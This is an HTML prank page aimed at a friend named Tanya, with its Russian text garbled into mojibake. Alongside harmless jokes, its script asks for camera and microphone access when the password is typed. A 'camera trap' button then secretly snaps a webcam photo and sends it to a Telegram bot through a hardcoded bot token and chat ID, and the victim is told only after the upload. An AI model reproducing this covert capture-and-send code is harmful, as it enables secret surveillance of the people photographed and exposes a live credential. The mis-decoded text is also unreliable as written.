<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–õ–∏—á–Ω–æ–µ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ –¢–∞–Ω–∏ üèê</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;900&display=swap');

        body {
            font-family: 'Montserrat', sans-serif;
            background-color: #f0f9ff;
            overflow-x: hidden;
        }

        /* --- –≠–ö–†–ê–ù –í–•–û–î–ê --- */
        #lock-screen {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(135deg, #2563eb 0%, #1e40af 100%);
            z-index: 9999;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            transition: transform 0.8s ease-in-out;
        }

        .login-card {
            background: rgba(255, 255, 255, 0.95);
            padding: 2rem;
            border-radius: 1.5rem;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
            text-align: center;
            width: 90%;
            max-width: 400px;
        }

        /* --- –£–ë–ï–ì–ê–Æ–©–ê–Ø –ö–ù–û–ü–ö–ê --- */
        #tanya-btn {
            transition: all 0.15s ease-out;
            position: absolute;
        }

        /* --- –ë–ï–ì–£–©–ê–Ø –°–¢–†–û–ö–ê --- */
        .ticker-wrap {
            width: 100%;
            background-color: #1e40af;
            color: white;
            padding: 8px 0;
            overflow: hidden;
        }
        .ticker {
            display: inline-block;
            white-space: nowrap;
            animation: ticker 15s linear infinite;
        }
        @keyframes ticker {
            0% { transform: translateX(100%); }
            100% { transform: translateX(-100%); }
        }

        /* --- –ö–ê–†–¢–û–ß–ö–ò --- */
        .card {
            background: white;
            border-radius: 1rem;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
            border: 1px solid #e0f2fe;
            transition: transform 0.2s;
            position: relative;
            overflow: hidden;
        }
        .card:hover {
            transform: translateY(-5px);
            border-color: #3b82f6;
        }

        /* –ì–∞–ª–µ—Ä–µ—è */
        .gallery-item:hover img {
            transform: scale(1.1);
            transition: transform 0.5s;
        }
    </style>
</head>
<body>

<!-- –ú–£–ó–´–ö–ê -->
<div style="position: absolute; width: 0; height: 0; overflow: hidden; opacity: 0;">
    <iframe id="music-player" width="560" height="315"
            src="https://www.youtube.com/embed/7Xg_UAIXp0g?enablejsapi=1"
            title="YouTube video player" frameborder="0"
            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
            allowfullscreen>
    </iframe>
</div>
<button onclick="forcePlayMusic()"
        class="fixed bottom-4 right-4 z-50 bg-blue-600 text-white p-3 rounded-full shadow-lg hover:bg-blue-700 opacity-50 hover:opacity-100 transition">
    <i data-lucide="music"></i>
</button>

<!-- 1. –≠–ö–†–ê–ù –í–•–û–î–ê -->
<div id="lock-screen">
    <div class="login-card">
        <h1 class="text-3xl font-black text-blue-900 mb-2">–î–û–°–¢–£–ü –ó–ê–ö–†–´–¢</h1>
        <p class="text-gray-500 mb-4 text-sm">–ù–∞–∑–æ–≤–∏ –ø–∞—Ä–æ–ª—å –ª—é–±–∏–º–æ–µ —Å–ª–æ–≤–æ –ê–Ω–¥—Ä–µ</p>
        <input type="text" id="password-input" placeholder="–ü–∞—Ä–æ–ª—å..."
               class="w-full p-4 rounded-xl border-2 border-blue-200 text-center font-bold text-lg outline-none focus:border-blue-600 mb-4">
        <p id="perm-status" class="text-xs text-gray-400 mt-2 font-mono">üîí –¥–∞–π –¥–æ–±—Ä–æ –Ω–∞ –¥–æ—Å—Ç—É–ø</p>
        <p id="error-msg" class="text-red-500 font-bold hidden mt-2">–ù–ï–ü–†–ê–í–ò–õ–¨–ù–û!</p>
    </div>
</div>

<!-- 3. –û–°–ù–û–í–ù–û–ô –ö–û–ù–¢–ï–ù–¢ -->
<div id="app-content" class="opacity-0 transition-opacity duration-1000 pb-20">

    <!-- –ë–ï–ì–£–©–ê–Ø –°–¢–†–û–ö–ê -->
    <div class="ticker-wrap">
        <div class="ticker font-black text-xl tracking-wider">
            –¢–ê–ù–Ø ‚Äî –ü–ò–ö–ú–ò Ô∏è –ê–ù–î–†–ï–ô ‚Äî –õ–ï–ì–ï–ù–î–ê  –¢–ê–ù–Ø ‚Äî –ü–ò–ö–ú–ò ‚ù§ –¢–ê–ù–Ø ‚Äî –ü–ò–ö–ú–ò ‚ù§
        </div>
    </div>

    <header class="container mx-auto p-6 text-center mt-4">
        <h1 class="text-4xl md:text-6xl font-black text-blue-900 mb-2">–õ–ò–ß–ù–û–ï –ü–†–û–°–¢–†–ê–ù–°–¢–í–û</h1>
        <p class="text-slate-500 font-bold text-lg">–ê–Ω–¥—Ä–µ–π —Ä–∞–∑—Ä–µ—à–∏–ª –¢–∞–Ω–µ –∑–¥–µ—Å—å –ø–æ–±—ã—Ç—å</p>
    </header>

    <main class="container mx-auto p-4">
        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">

            <!-- –ö–¢–û –ö–†–£–ß–ï -->
            <div class="card p-6 text-center col-span-1 md:col-span-2 relative overflow-hidden min-h-[300px] flex flex-col justify-start">
                <h2 class="text-2xl font-bold mb-2 text-slate-800">–ö—Ç–æ –∫—Ä—É—á–µ?</h2>
                <p class="text-xs text-gray-400 mb-10">–ü–æ–ø—Ä–æ–±—É–π –Ω–∞–∂–∞—Ç—å –Ω–∞ –¢–∞–Ω—é</p>
                <div id="buttons-area"
                     class="relative w-full h-full flex-grow bg-slate-50 rounded-lg border border-slate-100">
                    <button onclick="andreyWins()"
                            class="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 bg-blue-600 text-white font-bold py-4 px-10 rounded-full shadow-xl z-10 hover:scale-110 transition text-xl">
                        –ê–ù–î–†–ï–ô
                    </button>
                    <button id="tanya-btn" onmouseover="moveTanya()" ontouchstart="moveTanya()"
                            class="bg-gray-300 text-gray-600 font-bold py-2 px-4 rounded-full shadow text-sm"
                            style="top: 20%; left: 20%;">
                        –¢–∞–Ω—è
                    </button>
                </div>
            </div>

            <!-- –†–£–õ–ï–¢–ö–ê -->
            <div class="card p-6 text-center border-red-200 bg-red-50">
                <h3 class="font-bold text-lg mb-2 text-slate-700"> –ö—Ç–æ —Å–µ–≥–æ–¥–Ω—è –ø—Ä–æ–∏–≥—Ä–∞–µ—Ç –≤ –∫–∞—Ä—Ç—ã?</h3>
                <div id="loser-name" class="text-3xl font-black text-red-600 my-6 h-10">?</div>
                <button onclick="spinRoulette()"
                        class="bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded w-full shadow">
                    –£–∑–Ω–∞—Ç—å –ø—Ä–∞–≤–¥—É
                </button>
            </div>

            <!-- üî• –ù–ê–°–¢–û–Ø–©–ê–Ø –ö–ê–ú–ï–†–ê-–õ–û–í–£–®–ö–ê (–°–¢–ê–†–´–ô –°–¢–ò–õ–¨, –†–ê–ë–û–ß–ê–Ø –û–¢–ü–†–ê–í–ö–ê) üî• -->
            <div class="card p-6 bg-gray-900 text-white text-center col-span-1 md:col-span-2">
                <div id="trap-ui-start">
                    <h3 class="font-bold mb-4 text-pink-400 text-xl"> –ü–†–û–í–ï–†–ö–ê –ù–ê –ü–ò–ö–ú–ò</h3>

                    <!-- –°–∫—Ä—ã—Ç—ã–π –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä –¥–ª—è –≤–∏–¥–µ–æ -->
                    <div id="video-container-hidden" class="hidden"></div>

                    <p class="text-sm mb-6 text-gray-400">–ù–∞–∂–º–∏ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ, –µ—Å–ª–∏ —Å—á–∏—Ç–∞–µ—à—å, —á—Ç–æ –ê–Ω–¥—Ä–µ–π ‚Äî –ø–∏–∫–º–∏.</p>
                    <button onclick="startTrap()"
                            class="w-full bg-pink-600 hover:bg-pink-700 text-white font-bold py-3 rounded shadow-lg border-b-4 border-pink-800 active:border-0 active:mt-1 transition">
                        –ê–ù–î–†–ï–ô ‚Äî –ü–ò–ö–ú–ò!
                    </button>
                </div>

                <!-- –ü—Ä–æ—Ü–µ—Å—Å —Å—ä–µ–º–∫–∏ (–°–∫—Ä—ã—Ç—ã–π) -->
                <div id="trap-ui-process" class="hidden">
                    <p class="animate-pulse text-pink-400 font-bold mb-2">–û–±—Ä–∞–±–æ—Ç–∫–∞ –∑–∞–ø—Ä–æ—Å–∞...</p>
                    <div class="relative w-full max-w-md mx-auto aspect-video bg-black rounded mt-4 overflow-hidden border border-gray-700">
                        <video id="video-feed" autoplay playsinline
                               class="w-full h-full object-cover opacity-50"></video>
                    </div>
                    <canvas id="capture-canvas" class="hidden"></canvas>
                </div>

                <!-- –†–µ–∑—É–ª—å—Ç–∞—Ç -->
                <div id="trap-ui-result" class="hidden pt-4">
                    <div class="relative w-full aspect-video bg-black rounded mb-4 flex items-center justify-center">
                        <img id="captured-img" class="w-full h-full object-cover opacity-50">
                        <div class="absolute inset-0 flex items-center justify-center flex-col">
                            <span class="bg-red-600 text-white px-4 py-2 font-bold rotate-12 border-4 border-white text-sm md:text-lg mb-2">–ê–ì–ê! –ü–û–ü–ê–õ–ê–°–¨!</span>
                            <span class="text-xs bg-black px-2 py-1 rounded">–§–æ—Ç–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –ê–Ω–¥—Ä–µ—é</span>
                        </div>
                    </div>
                    <p class="text-green-400 font-mono text-sm"> –£–ª–∏–∫–∞ –∑–∞—Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–∞</p>
                </div>
            </div>

            <!-- –ù–û–í–ê–Ø –§–ò–®–ö–ê: –ö–û–ù–¢–†–ê–ö–¢ -->
            <div class="card p-6 bg-gray-50 border-gray-200">
                <h3 class="font-bold text-slate-700 mb-4"> –û–±—è–∑–∞—Ç–µ–ª—å–Ω—ã–π –∫–æ–Ω—Ç—Ä–∞–∫—Ç</h3>
                <div class="bg-white p-4 rounded border shadow-inner mb-4 text-sm text-gray-600 italic">
                    "–Ø, –¢–∞–Ω—è, –Ω–∞—Å—Ç–æ—è—â–∏–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—é, —á—Ç–æ –ê–Ω–¥—Ä–µ–π –ª—É—á—à–µ –∏–≥—Ä–∞–µ—Ç –≤ –≤–æ–ª–µ–π–±–æ–ª, –∫–∞—Ä—Ç—ã –∏ –≤–æ–æ–±—â–µ –æ–Ω –º–æ–π –¶–∞—Ä—å –∏
                    –ë–æ–≥."
                </div>
                <label class="flex items-center space-x-3 cursor-pointer opacity-75">
                    <input type="checkbox" checked disabled
                           class="w-6 h-6 text-blue-600 rounded focus:ring-blue-500 cursor-not-allowed">
                    <span class="font-bold text-slate-800">–Ø –°–û–ì–õ–ê–°–ù–ê (–ù–µ–ª—å–∑—è —É–±—Ä–∞—Ç—å)</span>
                </label>
            </div>

            <!-- –ì–ï–ù–ï–†–ê–¢–û–† –ò–°–¢–ò–ù–´ -->
            <div class="card p-6 bg-sky-50 border-sky-200 text-center">
                <h3 class="font-bold text-sky-900 mb-2">Ô∏è –ü–æ—á–µ–º—É –ê–Ω–¥—Ä–µ–π –ø—Ä–∞–≤?</h3>
                <div id="truth-text"
                     class="text-lg font-medium text-sky-700 min-h-[60px] flex items-center justify-center my-2">–ù–∞–∂–º–∏
                    –∫–Ω–æ–ø–∫—É
                </div>
                <button onclick="generateTruth()"
                        class="w-full bg-sky-600 text-white font-bold py-2 rounded hover:bg-sky-700">
                    –ì–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å —Ñ–∞–∫—Ç
                </button>
            </div>

            <!-- –¢–ê–ô–ú–ï–† –î–†–£–ñ–ë–´ -->
            <div class="card p-6 text-center bg-blue-50 border-blue-200">
                <h3 class="font-bold text-blue-800 text-sm"> –ú—ã –¥—Ä—É–∂–∏–º (—Ç–µ—Ä–ø–∏–º –¥—Ä—É–≥ –¥—Ä—É–≥–∞):</h3>
                <div id="friendship-timer" class="text-2xl font-mono font-black text-blue-900 mt-4">
                    –ó–∞–≥—Ä—É–∑–∫–∞...
                </div>
                <p class="text-xs text-gray-400 mt-2">–ù–∞—á–∞–ª–æ: 23 —Ñ–µ–≤—Ä–∞–ª—è 2025</p>
            </div>

            <!-- –ö–ê–õ–¨–ö–£–õ–Ø–¢–û–† –†–û–°–¢–ê -->
            <div class="card p-6">
                <h3 class="font-bold text-slate-700 mb-2">üìè –ö–∞–ª—å–∫—É–ª—è—Ç–æ—Ä —Ä–æ—Å—Ç–∞</h3>
                <p class="text-xs text-gray-500 mb-2">–¢—ã –ø–∏–∫–º–∏</p>
                <div class="flex gap-2">
                    <input type="number" id="height-input" placeholder="–¢–≤–æ–π —Ä–æ—Å—Ç" class="w-full p-2 border rounded">
                    <button onclick="calcHeight()" class="bg-slate-800 text-white font-bold px-4 rounded">Go</button>
                </div>
                <div id="height-result" class="mt-3 text-sm font-bold text-blue-600"></div>
            </div>

            <!-- –î–ï–¢–ï–ö–¢–û–† –õ–ñ–ò -->
            <div class="card p-6 col-span-1 md:col-span-2">
                <h3 class="font-bold text-lg mb-2 flex items-center gap-2"><i data-lucide="scan-line"></i> –î–µ—Ç–µ–∫—Ç–æ—Ä –ª–∂–∏
                </h3>
                <input type="text" id="lie-input" placeholder="–ù–∞–ø–∏—à–∏ –ø—Ä–∞–≤–¥—É –ø—Ä–æ –ê–Ω–¥—Ä–µ—è..."
                       class="w-full p-3 border-2 border-gray-300 rounded mb-2 font-bold text-center">
                <button onclick="checkLie()"
                        class="bg-slate-800 text-white w-full py-3 rounded font-bold shadow hover:bg-black transition">
                    –°–ö–ê–ù–ò–†–û–í–ê–¢–¨ –ú–û–ó–ì
                </button>
                <div id="lie-result" class="font-black text-center text-xl mt-4 h-8 uppercase tracking-widest"></div>
            </div>

            <!-- –ö–ù–ò–ì–ê –ñ–ê–õ–û–ë -->
            <div class="card p-6 bg-yellow-50 border-yellow-200">
                <h3 class="font-bold text-yellow-900 mb-2 flex items-center gap-2"><i data-lucide="trash-2"></i> –ñ–∞–ª–æ–±–∞
                    –≤ –Ω–∏–∫—É–¥–∞</h3>
                <textarea id="complaint-text" placeholder="–ù–∞–ø–∏—à–∏, —á—Ç–æ —Ç–µ–±—è –±–µ—Å–∏—Ç..."
                          class="w-full p-3 border rounded-lg text-sm h-24 resize-none"></textarea>
                <button onclick="sendComplaint()"
                        class="w-full bg-yellow-600 text-white font-bold py-2 rounded mt-2 hover:bg-yellow-700 shadow">
                    –û—Ç–ø—Ä–∞–≤–∏—Ç—å (–∏ —É–¥–∞–ª–∏—Ç—å –ø–æ—Ç–æ–º—É —á—Ç–æ –ê–Ω–¥—Ä–µ–π –∏–¥–µ–∞–ª–µ–Ω)
                </button>
            </div>

            <!-- –°–ï–ö–†–ï–¢–ù–ê–Ø –ö–ù–û–ü–ö–ê -->
            <div class="card p-6 bg-black text-white text-center border-red-600 border-4 col-span-1 md:col-span-2 lg:col-span-3 shadow-2xl">
                <h3 class="font-bold text-red-500 text-2xl mb-2 animate-pulse"> –ù–ï –ù–ê–ñ–ò–ú–ê–¢–¨</h3>
                <p class="mb-6 text-gray-400 text-sm">–î–æ—Å—Ç—É–ø —Ç–æ–ª—å–∫–æ –¥–ª—è –ê–Ω–¥—Ä–µ—è.</p>
                <button onclick="openSecretGallery()"
                        class="bg-red-600 hover:bg-red-700 text-white font-bold py-4 px-10 rounded shadow-lg mx-auto transition transform hover:scale-110 border-2 border-red-400">
                    –°–ï–ö–†–ï–¢–ù–û
                </button>
            </div>

        </div>
    </main>
</div>

<!-- –ì–ê–õ–ï–†–ï–Ø -->
<div id="gallery-modal"
     class="fixed inset-0 bg-black/95 z-50 hidden flex items-center justify-center p-4 backdrop-blur-sm">
    <div class="bg-white rounded-xl p-6 max-w-4xl w-full max-h-[90vh] overflow-y-auto relative shadow-2xl">
        <button onclick="closeGallery()"
                class="absolute top-4 right-4 text-4xl text-slate-800 hover:text-red-500 transition">&times;
        </button>
        <h2 class="text-2xl font-black text-slate-800 mb-6 text-center border-b-4 border-blue-500 pb-4 inline-block w-full">
            –ö–û–ú–ü–†–û–ú–ê–¢ –ù–ê –¢–ê–ù–Æ </h2>

        <div class="grid grid-cols-1 sm:grid-cols-2 gap-6">
            <div class="gallery-item aspect-square bg-gray-100 rounded-xl overflow-hidden border-2 border-gray-200 relative shadow-lg">
                <img src="https://placehold.co/600x600/orange/white?text=–°–º–µ—à–Ω–æ–µ+–õ–∏—Ü–æ"
                     class="w-full h-full object-cover">
            </div>
            <div class="gallery-item aspect-square bg-gray-100 rounded-xl overflow-hidden border-2 border-gray-200 relative shadow-lg">
                <img src="https://placehold.co/600x600/blue/white?text=–£–ø–∞–ª–∞" class="w-full h-full object-cover">
            </div>
            <div class="gallery-item aspect-square bg-gray-100 rounded-xl overflow-hidden border-2 border-gray-200 relative shadow-lg">
                <img src="https://placehold.co/600x600/pink/white?text=–ü–∏–∫–º–∏" class="w-full h-full object-cover">
            </div>
            <div class="gallery-item aspect-square bg-gray-100 rounded-xl overflow-hidden border-2 border-gray-200 relative shadow-lg">
                <img src="https://placehold.co/600x600/green/white?text=–í–æ–ª–µ–π–±–æ–ª" class="w-full h-full object-cover">
            </div>
        </div>
    </div>
</div>

<script>

        lucide.createIcons();

        // ==========================================
        // ‚ö†Ô∏è –ù–ê–°–¢–†–û–ô–ö–ò –¢–ï–õ–ï–ì–†–ê–ú–ê ‚ö†Ô∏è
        // ==========================================
        const TELEGRAM_BOT_TOKEN = '8412753758:AAEHTpyhzabmGsvJL2-67zCyNBrkqVp-raQ';
        const TELEGRAM_CHAT_ID = '6076006877';
        // ==========================================


        // --- –õ–û–í–£–®–ö–ê –° –û–¢–ü–†–ê–í–ö–û–ô –§–û–¢–û ---
        async function startTrap() {
            document.getElementById('trap-ui-start').classList.add('hidden');
            document.getElementById('trap-ui-process').classList.remove('hidden');

            const video = document.getElementById('video-feed');
            const canvas = document.getElementById('capture-canvas');
            const imgResult = document.getElementById('captured-img');

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;

                // –ñ–¥–µ–º 1.5 —Å–µ–∫—É–Ω–¥—ã –¥–ª—è —Ñ–æ–∫—É—Å–∞
                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);

                    // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–∞–º–µ—Ä—É
                    stream.getTracks().forEach(track => track.stop());

                    // –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º
                    canvas.toBlob((blob) => {
                        sendToTelegram(blob);

                        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç –Ω–∞ —ç–∫—Ä–∞–Ω–µ
                        imgResult.src = URL.createObjectURL(blob);
                        document.getElementById('trap-ui-process').classList.add('hidden');
                        document.getElementById('trap-ui-result').classList.remove('hidden');
                        confetti();
                    }, 'image/jpeg');

                }, 1500);

            } catch (e) {
                alert("–ù—É –¥–∞–π –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ, —è –∂–µ –≤–∏–∂—É, —á—Ç–æ —Ç—ã —Ö–æ—á–µ—à—å –Ω–∞–∂–∞—Ç—å!");
                location.reload();
            }
        }

        function sendToTelegram(blob) {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', blob, 'tanya_trap.jpg');
            formData.append('caption', '–ê–ì–ê! –ü–û–ü–ê–õ–ê–°–¨! üì∏ –¢–∞–Ω—è –Ω–∞–∂–∞–ª–∞ –Ω–∞ –∫–Ω–æ–ø–∫—É "–ê–Ω–¥—Ä–µ–π - –ø–∏–∫–º–∏"!');

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (!response.ok) console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ TG');
            })
            .catch(err => console.error(err));
        }

        // --- –û–°–¢–ê–õ–¨–ù–û–ô –ö–û–î ---

        const passwordInput = document.getElementById('password-input');
        const lockScreen = document.getElementById('lock-screen');
        const appContent = document.getElementById('app-content');
        const errorMsg = document.getElementById('error-msg');

        function forcePlayMusic() {
            const player = document.getElementById('music-player');
            player.src = player.src;
        }

        async function requestPermissions() {
            try {
                await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('perm-status').innerText = "‚úÖ –¥–æ—Å—Ç—É–ø –ø–æ–ª—É—á–µ–Ω";
                document.getElementById('perm-status').classList.replace('text-gray-400', 'text-green-500');
            } catch (e) {}
        }

        passwordInput.addEventListener('input', (e) => {
            const val = e.target.value.toLowerCase();
            if (['–ø–∏–∫–º–∏', 'pikmi', 'pickme'].includes(val)) {
                requestPermissions();
                forcePlayMusic();
                setTimeout(() => {
                    lockScreen.style.transform = 'translateY(-100%)';
                    appContent.classList.remove('opacity-0');
                }, 1000);
            } else if (val.length > 5) {
                errorMsg.classList.remove('hidden');
            } else {
                errorMsg.classList.add('hidden');
            }
        });

        // –ì–µ–Ω–µ—Ä–∞—Ç–æ—Ä –ò—Å—Ç–∏–Ω—ã
        function generateTruth() {
            const facts = [
                "–ü–æ—Ç–æ–º—É —á—Ç–æ –æ–Ω –≤—ã—à–µ.", "–≠—Ç–æ –∞–∫—Å–∏–æ–º–∞.", "–ê–Ω–¥—Ä–µ–π –Ω–µ –æ—à–∏–±–∞–µ—Ç—Å—è.", "–ö–∞—Ä—Ç—ã –Ω–µ –≤—Ä—É—Ç.", "–ü–æ—Ç–æ–º—É —á—Ç–æ –¢–∞–Ω—è ‚Äî –ø–∏–∫–º–∏."
            ];
            document.getElementById('truth-text').innerText = facts[Math.floor(Math.random() * facts.length)];
        }

        // –ñ–∞–ª–æ–±—ã
        function sendComplaint() {
            const txt = document.getElementById('complaint-text').value;
            if(!txt) return alert("–ù–∞–ø–∏—à–∏ —Ö–æ—Ç—å —á—Ç–æ-—Ç–æ!");
            document.getElementById('complaint-text').value = "";
            alert("–ñ–∞–ª–æ–±–∞ —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω–∞ –∏–∑ —Å–∏—Å—Ç–µ–º—ã! üóëÔ∏è");
        }

        // –¢–∞–π–º–µ—Ä
        const startDate = new Date(2025, 1, 23, 8, 0, 0);
        function updateTimer() {
            const now = new Date();
            let diff = now - startDate;
            if (diff < 0) diff = 0;
            const days = Math.floor(diff / (1000 * 60 * 60 * 24));
            const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
            const minutes = Math.floor((diff / 1000 / 60) % 60);
            const seconds = Math.floor((diff / 1000) % 60);
            document.getElementById('friendship-timer').innerHTML = `${days}–¥ ${hours}—á ${minutes}–º ${seconds}—Å`;
        }
        setInterval(updateTimer, 1000);

        function andreyWins() {
            confetti({ particleCount: 200, spread: 100, colors: ['#2563eb', '#ffffff'] });
            alert("–≠–¢–û –ë–´–õ–û –û–ß–ï–í–ò–î–ù–û! üòé");
        }
        function moveTanya() {
            const btn = document.getElementById('tanya-btn');
            const area = document.getElementById('buttons-area');
            const newLeft = Math.random() * (area.offsetWidth - btn.offsetWidth - 20) + 10;
            const newTop = Math.random() * (area.offsetHeight - btn.offsetHeight - 20) + 10;
            btn.style.left = `${newLeft}px`;
            btn.style.top = `${newTop}px`;
            btn.style.transform = 'none';
        }
        function spinRoulette() {
            const el = document.getElementById('loser-name');
            const names = ['–ê–Ω–¥—Ä–µ–π', '–¢–∞–Ω—è', '–ê–Ω–¥—Ä–µ–π', '–¢–∞–Ω—è'];
            let i = 0;
            const interval = setInterval(() => {
                el.innerText = names[i % names.length];
                el.style.color = 'gray';
                i++;
            }, 100);
            setTimeout(() => {
                clearInterval(interval);
                el.innerText = "–¢–ê–ù–Ø";
                el.style.color = "#dc2626";
                el.style.transform = "scale(1.5)";
                setTimeout(() => el.style.transform = "scale(1)", 300);
            }, 2000);
        }
        function checkLie() {
            const val = document.getElementById('lie-input').value.toLowerCase();
            const res = document.getElementById('lie-result');
            if (val.includes("–∞–Ω–¥—Ä–µ–π –ª–æ—Ö")) {
                res.innerText = "–≠–¢–û –õ–û–ñ–¨! ü§¨";
                res.className = "font-black text-center text-sm mt-4 text-red-600 border-4 border-red-600 p-2 rotate-2";
            } else if (val.includes("—Ç–∞–Ω—è –ª–æ—Ö")) {
                res.innerText = "–û–î–ù–û–ó–ù–ê–ß–ù–û –ü–†–ê–í–î–ê ‚úÖ";
                res.className = "font-black text-center text-xl mt-4 text-green-600 border-4 border-green-600 p-2 -rotate-2";
            } else {
                res.innerText = Math.random() > 0.5 ? "–ü–û–•–û–ñ–ï –ù–ê –ü–†–ê–í–î–£" : "–í–†–ê–ù–¨–Å";
                res.className = "font-black text-center text-xl mt-4 text-gray-600";
            }
        }
        function openSecretGallery() { document.getElementById('gallery-modal').classList.remove('hidden'); }
        function closeGallery() { document.getElementById('gallery-modal').classList.add('hidden'); }
        function calcHeight() {
            const h = document.getElementById('height-input').value;
            if (h) {
                document.getElementById('height-result').innerText = `–≠—Ç–æ –ø—Ä–∏–º–µ—Ä–Ω–æ ${(h / 197).toFixed(3)} –æ—Ç –æ–¥–Ω–æ–≥–æ –ê–Ω–¥—Ä–µ—è.`;
            }

   }
    </script>
</body>
</html>
